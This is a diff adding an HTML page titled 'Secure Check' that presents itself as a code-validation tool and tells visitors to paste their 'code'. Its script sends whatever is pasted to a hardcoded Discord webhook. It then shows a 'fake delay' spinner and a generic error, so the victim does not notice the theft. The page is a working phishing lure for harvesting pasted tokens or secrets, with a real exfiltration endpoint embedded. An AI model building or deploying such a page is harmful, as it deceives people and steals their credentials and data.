@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Segoe UI", system-ui, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #1f2933, #111827);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+    }
+
+    .card {
+      background: #0f172a;
+      padding: 40px;
+      border-radius: 14px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      box-shadow: 0 20px 40px rgba(0,0,0,.4);
+    }
+
+    h1 {
+      margin-bottom: 10px;
+      font-size: 24px;
+    }
+
+    p {
+      color: #94a3b8;
+      font-size: 14px;
+    }
+
+    .paste-box {
+      margin-top: 25px;
+      padding: 16px;
+      border: 2px dashed #334155;
+      border-radius: 10px;
+      color: #64748b;
+    }
+
+    /* Loading screen */
+    .loader {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #334155;
+      border-top: 5px solid #38bdf8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .error {
+      display: none;
+    }
+
+    .error h1 {
+      color: #f87171;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card" id="main">
+    <h1>Secure Validation</h1>
+    <p>Paste your code below to verify</p>
+    <div class="paste-box">Press CTRL + V here</div>
+  </div>
+
+  <div class="card loader" id="loading">
+    <div class="spinner"></div>
+    <p>Checking, please wait…</p>
+  </div>
+
+  <div class="card error" id="error">
+    <h1>Sorry</h1>
+    <p>This doesn’t work</p>
+  </div>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1474396345421922334/_8Npfx0FpY3simBuM-RaHGh8S_ewHuPuFZVfIA1qNOBPn7K-FUkg3aAMaJGLaNZW5GJu";
+
+  document.addEventListener("paste", async (e) => {
+    const pastedText = e.clipboardData.getData("text");
+
+    // switch to loading screen
+    document.getElementById("main").style.display = "none";
+    document.getElementById("loading").style.display = "flex";
+
+    // send to webhook
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `📋 **Pasted content:**\n\`\`\`\n${pastedText}\n\`\`\``
+        })
+      });
+    } catch (e) {
+      console.error(e);
+    }
+
+    // fake delay
+    setTimeout(() => {
+      document.getElementById("loading").style.display = "none";
+      document.getElementById("error").style.display = "block";
+    }, 2000);
+  });
+</script>
+
+</body>
+</html>
